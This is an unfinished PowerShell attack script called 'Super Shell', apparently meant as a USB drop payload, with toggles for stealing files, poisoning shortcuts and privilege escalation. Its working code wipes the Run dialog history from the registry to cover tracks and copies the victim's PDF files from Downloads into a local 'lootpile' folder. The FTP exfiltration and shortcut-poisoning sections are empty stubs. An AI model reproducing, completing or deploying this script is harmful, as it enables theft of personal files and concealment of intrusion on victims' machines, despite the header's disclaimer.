# Super Shell by DanTheGoodman, don't use maliciously!

# Config Section, configure options with 'yes' or 'no':

# Shortcut Section:
$poison_shortcuts='yes'
$shortcut_privesc='no'

# File Stealing Section:
$steal_files_enabled='yes'
$steal_files_usb='yes'
$steal_files_ftp='yes'
$steal_desktop_folder='yes'
$steal_documents_folder='yes'
$steal_downloads_folder='yes'

# Alright let's get to the payload!

# First we clear the runline history:
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

# Now, it's USB Extraction time! (if it's enabled, of course)
If ($steal_files_usb -eq 'yes') {
  $exfil_dir="$Env:UserProfile\Downloads"
  $exfil_ext="*.pdf"
  $loot_dir="$PSScriptRoot\lootpile\"
  mkdir $loot_dir
  robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
}

# Alright FTP time!

# Shortcut section (oh this is going to get complicated...)

If ($poison_shortcuts -eq 'yes'  -AND $shortcut_privesc -eq 'yes') {

} ElseIf ($poison_shortcuts -eq 'yes') {

}
